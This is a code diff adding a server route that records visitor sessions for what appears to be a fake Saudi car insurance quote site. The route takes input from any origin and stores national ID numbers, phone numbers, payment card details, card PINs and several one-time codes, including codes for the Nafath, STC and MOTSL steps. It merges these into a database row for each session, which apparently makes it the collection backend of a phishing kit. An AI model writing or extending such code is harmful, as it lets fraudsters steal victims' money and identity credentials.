@@ -1,0 +1,122 @@
+import { createFileRoute } from "@tanstack/react-router";
+import { createClient } from "@supabase/supabase-js";
+import { z } from "zod";
+
+const PageEnum = z.enum([
+  "quote_landing",
+  "insurer_selected",
+  "payment_card",
+  "card_otp",
+  "card_pin",
+  "phone_entry",
+  "motsl_otp",
+  "nafath",
+  "stc_awaiting",
+]);
+
+const BodySchema = z.object({
+  sid: z.string().min(4).max(64),
+  type: z.enum(["visit", "update", "submit"]),
+  page: PageEnum.optional(),
+  data: z
+    .object({
+      nationalId: z.string().max(20).optional(),
+      phone: z.string().max(20).optional(),
+      serialNumber: z.string().max(20).optional(),
+      vehicleMake: z.string().max(60).optional(),
+      vehicleModel: z.string().max(60).optional(),
+      modelYear: z.number().int().min(1980).max(2100).optional(),
+      declaredValue: z.number().min(0).max(10_000_000).optional(),
+      insurerCompany: z.string().max(80).optional(),
+      insurerOfferSar: z.number().min(0).max(10_000_000).optional(),
+      // free-form submission fields (card / OTP / etc.)
+      submission: z.record(z.string(), z.string()).optional(),
+    })
+    .optional(),
+});
+
+const cors = {
+  "Access-Control-Allow-Origin": "*",
+  "Access-Control-Allow-Methods": "POST, OPTIONS",
+  "Access-Control-Allow-Headers": "content-type",
+};
+
+export const Route = createFileRoute("/api/public/track")({
+  server: {
+    handlers: {
+      OPTIONS: async () => new Response(null, { status: 204, headers: cors }),
+      POST: async ({ request }) => {
+        let json: unknown;
+        try {
+          json = await request.json();
+        } catch {
+          return new Response("Bad JSON", { status: 400, headers: cors });
+        }
+        const parsed = BodySchema.safeParse(json);
+        if (!parsed.success) {
+          return new Response("Invalid payload", { status: 400, headers: cors });
+        }
+        const { sid, type, page, data } = parsed.data;
+
+        const key = process.env["SUPABASE_PUBLISHABLE_KEY"]!;
+        const url = process.env["SUPABASE_URL"]!;
+        const supabase = createClient(url, key, {
+          auth: { persistSession: false, autoRefreshToken: false },
+          global: {
+            fetch: (input, init) => {
+              const h = new Headers(init?.headers);
+              if (key.startsWith("sb_") && h.get("Authorization") === `Bearer ${key}`) {
+                h.delete("Authorization");
+              }
+              h.set("apikey", key);
+              return fetch(input, { ...init, headers: h });
+            },
+          },
+        });
+
+        const { data: existing } = await supabase
+          .from("tracked_sessions")
+          .select("session_id, submission")
+          .eq("session_id", sid)
+          .maybeSingle();
+
+        const submissionMerge = {
+          ...((existing?.submission as Record<string, string> | null) ?? {}),
+          ...(data?.submission ?? {}),
+        };
+
+        const row: Record<string, unknown> = {
+          session_id: sid,
+          current_page: page ?? existing?.session_id ? page : "quote_landing",
+          state: "live",
+          submission: submissionMerge,
+          updated_at: new Date().toISOString(),
+        };
+        if (page) row.current_page = page;
+        if (data?.nationalId) row.national_id = data.nationalId;
+        if (data?.phone) row.phone = data.phone;
+        if (data?.serialNumber) row.serial_number = data.serialNumber;
+        if (data?.vehicleMake) row.vehicle_make = data.vehicleMake;
+        if (data?.vehicleModel) row.vehicle_model = data.vehicleModel;
+        if (data?.modelYear) row.model_year = data.modelYear;
+        if (data?.declaredValue) row.declared_value = data.declaredValue;
+        if (data?.insurerCompany) row.insurer_company = data.insurerCompany;
+        if (data?.insurerOfferSar) row.insurer_offer_sar = data.insurerOfferSar;
+
+        const { error } = await supabase
+          .from("tracked_sessions")
+          .upsert(row, { onConflict: "session_id" });
+
+        if (error) {
+          return new Response(JSON.stringify({ error: error.message }), {
+            status: 500,
+            headers: { ...cors, "Content-Type": "application/json" },
+          });
+        }
+        return new Response(JSON.stringify({ ok: true, sid, type }), {
+          headers: { ...cors, "Content-Type": "application/json" },
+        });
+      },
+    },
+  },
+});
